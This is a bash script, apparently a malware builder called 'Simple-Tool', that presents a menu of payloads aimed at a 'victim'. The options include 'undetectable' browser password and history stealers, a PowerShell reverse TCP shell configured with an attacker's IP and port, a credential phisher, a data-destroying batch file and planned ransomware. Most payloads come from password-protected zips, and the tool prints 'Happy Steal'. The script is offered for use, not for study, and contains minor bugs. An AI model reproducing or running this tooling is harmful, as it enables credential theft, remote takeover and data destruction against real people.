#!/bin/bash/

trap 'printf "\n";stop;exit 1' 2

clear
printf '''\n\e[1;77m   _____ _                 _          _______          _  \e[0m'''
printf '''\n\e[1;77m  / ____(_)               | |        |__   __|        | | \e[0m'''
printf '''\n\e[1;77m | (___  _ _ __ ___  _ __ | | ___ ______| | ___   ___ | | \e[0m'''
printf "\n\e[1;77m  \___ \| | '_ ' _ \| '_ \| |/ _ \______| |/ _ \ / _ \| | \e[0m"
printf '''\n\e[1;77m  ____) | | | | | | | |_) | |  __/      | | (_) | (_) | | \e[0m'''
printf '''\n\e[1;77m |_____/|_|_| |_| |_| .__/|_|\___|      |_|\___/ \___/|_| \e[0m'''
printf '''\n\e[1;77m                    | |                                   \e[0m'''
printf '''\n\e[1;77m                    |_|                                   \e[0m\n'''

printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Notification[AutoType_In_Cmd]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Browser_Password_Stealers[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Ps_Reverse_Tcp_Payload[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Browser_History_Stealer\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Login_Phisher[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Skull_Logo\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Unstopper[Continues CD Ejector And Mouse Swapper]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m System_Destroyer[Data Eater]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Ps_Ransomware[Undetectable]\e[0m\n"
read -p $'\n\e[1;93m>>>>\e[0m' menu


if [[ $menu == 01 || $menu == 1 ]]
then
clear
printf "\e[1;31mEnter The Message To Auto Type And Display In FullScreen In CMD\e[0m"
printf "\e\n[1;31mTottaly For Prank The Victim Or Making Notify To The Victim\e[0m"
printf "\e\n[1;31mOutput Extention : .vbs\e[0m"
read -p $'\n\e[1;93mEnter_Output_File_Name: \e[0m' Autotyper
read -p $'\n\e[1;93mEnter_Message: \e[0m' msg_display
echo strText='"'$msg_display'"' >> $Autotyper.vbs
printf '''\nCall AutoTypeWriter(strText)\n''' >> $Autotyper.vbs
printf '''Sub AutoTypeWriter(strText)\n''' >> $Autotyper.vbs
printf '''  intPause = 150\n''' >> $Autotyper.vbs
printf '''  Set Ws = CreateObject("WScript.Shell")\n''' >> $Autotyper.vbs
printf '''  Ws.Run "cmd.exe && clear",3\n''' >> $Autotyper.vbs
printf '''  WScript.Sleep 1000\n''' >> $Autotyper.vbs
printf '''  Set WshShell = WScript.CreateObject("WScript.Shell")\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "color 0a"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "prompt !!Message!! : "\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "cls"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{F11}"\n''' >> $Autotyper.vbs
printf '''  intTextLen = Len(strText)\n''' >> $Autotyper.vbs
printf '''  For x = 1 to intTextLen\n''' >> $Autotyper.vbs
printf '''    strTempText = Mid(strText,x,1)\n''' >> $Autotyper.vbs
printf '''    Ws.Sendkeys strTempText\n''' >> $Autotyper.vbs
printf '''    WScript.Sleep intPause\n''' >> $Autotyper.vbs
printf '''  Next\n''' >> $Autotyper.vbs
printf '''End Sub\n''' >> $Autotyper.vbs

elif [[ $menu == 02 || $menu == 2 ]]
then
clear
printf "\e\n[1;31mSteal The Browser Passwords As A Text File From The Victim\e[0m"
printf "\e\n[1;31mOutput Extention : .vbs\e[0m"
read -p $'\n\e[1;93mEnter_Output_File_Name: \e[0m' stealer
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== DarkRCovery_Obfuscated.zip
clear
mv DarkRCovery_Obfuscated.vbs $stealer.vbs
prinf "Happy Steal"

elif [[ $menu == 03 || $menu == 3 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== powershell_reverse_tcp.zip
clear
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' ps_tcp
read -p $'\e\n[1;31mEnter The IpAdress:\e[0m' ip
read -p $'\e\n[1;31mEnter The Port:\e[0m' port
sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
mv powershell_reverse_tcp.txt $ps_tcp.ps1
rm -rf powershell_reverse_tcp.txt

elif [[ $menu == 04 || $menu == 4 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== GudGuy.zip
clear
printf "\e\n[1;31mOutput File Will Save As Text File In Temp\e[0m"
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' browse_history
mv GudGuy.ps1 $browse_history.ps1
rm -rf GudGuy.ps1

elif [[ $menu == 05 || $menu == 5 ]]                                                          >then
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== Pass_Phisher.zip
clear
mkdir Pass_Phisher
mv CredsPhish.ps1 Pass_Phisher
mv NewPhish.ps1 Pass_Phisher
printf "\e\n[1;31mFile Is Saved In Pass_Phisher Foleder\e[0m"

elif [[ $menu == 06 || $menu == 6 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== skull_logo.zip
clear
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' skull
mv skull_logo.bat $skull.bat 

elif [[ $menu == 07 || $menu == 7 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== Unstoppable.zip
clear
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' unstop
mv Unstoppable.vbs $unstop.vbs

elif [[ $menu == 08 || $menu == 8 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== venom.zip
clear
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' venom
mv venom.bat $venom.bat

elif [[ $menu == 09 || $menu == 9 ]]
then
clear
printf "\e\n[1;33mIts Comming Soon....\e[0m\n"

else
clear
printf "\e\n[1;5;34mInvalid Option\e[0m\n"
fi
